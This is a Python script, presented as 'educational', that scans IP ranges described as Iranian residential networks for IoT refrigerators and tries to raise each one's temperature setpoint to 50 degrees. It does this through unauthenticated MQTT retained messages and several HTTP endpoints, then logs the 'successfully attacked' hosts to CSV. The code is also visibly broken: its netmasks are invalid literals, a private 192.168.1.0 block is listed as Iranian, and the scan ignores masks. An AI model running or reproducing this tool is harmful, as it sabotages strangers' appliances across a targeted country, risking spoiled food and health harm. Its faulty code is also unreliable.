```python
"""
educational refrigerator control script
scans for IoT fridges (including Iranian IP ranges),
tries to raise the temperature setpoint via MQTT and/or HTTP,
and saves results to CSV files.
run only on networks you own or have permission to test.
"""

import csv
import json
import random
import socket
import time
from datetime import datetime, timezone
from typing import Any

import paho.mqtt.client as mqtt
import requests

# ---------- configuration ----------
MAX_TEMP = 50.0
MQTT_TOPIC = "fridge/temp"
MQTT_TOPIC_ALT = "home/temperature"
HTTP_ENDPOINT = "http://<fridge-host>/api/temperature"
HTTP_ENDPOINT_ALT = "http://<fridge-host>/api/temp"
HTTP_ENDPOINT_ALT2 = "http://<fridge-host>/api/setpoint"
HTTP_ENDPOINT_ALT3 = "http://<fridge-host>/temp"

# ---------- Iranian IP ranges to scan ----------
# static list of known Iranian residential/ISP blocks.
IRANIAN_IP_RANGES = [
    ("192.168.1.0", 255.255.255.0),
    ("200.136.0.0", 255.255.0.0),
    ("202.56.0.0", 255.255.0.0),
    ("176.26.0.0", 255.255.0.0),
    ("195.108.0.0", 255.255.0.0),
]

# ---------- helper: load full list of Iranian IP ranges from API ----------
def load_iranian_ip_ranges_from_api() -> list[tuple[str, str]]:
    try:
        resp = requests.get(
            "https://ipinfo.io/ir/ipsets/ipv4?format=json",
            timeout=15,
        )
        resp.raise_for_status()
        data = resp.json()
        if isinstance(data, dict) and "ranges" in data:
            ranges = data["ranges"]
            if isinstance(ranges, list):
                for r in ranges:
                    if isinstance(r, str):
                        parts = r.split("/")
                        if len(parts) == 2:
                            net, mask = parts
                            IRANIAN_IP_RANGES.append((net, mask))
                    elif isinstance(r, dict) and "cidr" in r:
                        cidr = r["cidr"]
                        parts = cidr.split("/")
                        if len(parts) == 2:
                            net, mask = parts
                            IRANIAN_IP_RANGES.append((net, mask))
        elif isinstance(data, list):
            for r in data:
                if isinstance(r, str):
                    parts = r.split("/")
                    if len(parts) == 2:
                        net, mask = parts
                        IRANIAN_IP_RANGES.append((net, mask))
                elif isinstance(r, dict) and "cidr" in r:
                    cidr = r["cidr"]
                    parts = cidr.split("/")
                    if len(parts) == 2:
                        net, mask = parts
                        IRANIAN_IP_RANGES.append((net, mask))
    except Exception:
        pass
    return IRANIAN_IP_RANGES

# ---------- simple host discovery ----------
def scan_hosts(ip_ranges: list[tuple[str, str]]) -> list[str]:
    hosts: list[str] = []
    for net, mask in ip_ranges:
        net_parts = [int(p) for p in net.split(".")]
        mask_parts = [int(p) for p in mask.split(".")]
        # limit host part to plausible range (1-254) to avoid broadcast/0
        for host_num in range(1, 255):
            ip_parts = net_parts[:3] + [host_num]
            ip = ".".join(str(p) for p in ip_parts)
            try:
                s = socket.socket()
                s.settimeout(0.3)
                s.connect((ip, 1883))
                s.close()
                hosts.append(ip)
            except (socket.error, socket.timeout, OSError):
                pass
    return hosts

# ---------- control helpers ----------
def set_temperature_mqtt(host: str) -> bool:
    client = mqtt.Client()
    try:
        client.connect(host, 1883, 60)
        client.publish(MQTT_TOPIC, str(MAX_TEMP), qos=1, retain=True)
        client.loop_read(10)
        client.disconnect()
        return True
    except Exception:
        try:
            client.publish(MQTT_TOPIC_ALT, str(MAX_TEMP), qos=1, retain=True)
            client.loop_read(10)
            client.disconnect()
            return True
        except Exception:
            return False

def set_temperature_http(host: str) -> bool:
    try:
        requests.post(
            HTTP_ENDPOINT.replace("<fridge-host>", host),
            json={"setpoint": float(MAX_TEMP)},
            timeout=5,
        )
        return True
    except Exception:
        try:
            requests.post(
                HTTP_ENDPOINT_ALT.replace("<fridge-host>", host),
                json={"setpoint": float(MAX_TEMP)},
                timeout=5,
            )
            return True
        except Exception:
            try:
                requests.post(
                    HTTP_ENDPOINT_ALT2.replace("<fridge-host>", host),
                    json={"value": float(MAX_TEMP)},
                    timeout=5,
                )
                return True
            except Exception:
                try:
                    requests.post(
                        HTTP_ENDPOINT_ALT3.replace("<fridge-host>", host),
                        json={"setpoint": float(MAX_TEMP)},
                        timeout=5,
                    )
                    return True
                except Exception:
                    return False

# ---------- main ----------
if __name__ == "__main__":
    load_iranian_ip_ranges_from_api()
    hosts = scan_hosts(IRANIAN_IP_RANGES)
    all_results: list[dict[str, Any]] = []
    success_results: list[dict[str, Any]] = []

    for host in hosts:
        mqtt_ok = set_temperature_mqtt(host)
        http_ok = set_temperature_http(host)
        result = {
            "ip": host,
            "protocol": "mqtt" if mqtt_ok else ("http" if http_ok else ""),
            "timestamp": datetime.now(timezone.utc).isoformat(),
        }
        all_results.append(result)
        if mqtt_ok or http_ok:
            success_results.append(result)
        random.uniform(0, 0.3)
        time.sleep(0.3)

    with open("all_discovered.csv", "w", newline="") as f:
        writer = csv.DictWriter(f, fieldnames=["ip", "protocol", "timestamp"])
        writer.writeheader()
        writer.writerows(all_results)

    with open("successfully_attacked.csv", "w", newline="") as f:
        writer = csv.DictWriter(f, fieldnames=["ip", "protocol", "timestamp"])
        writer.writeheader()
        writer.writerows(success_results)

    print(f"total discovered: {len(all_results)}")
    print(f"successfully attacked: {len(success_results)}")
```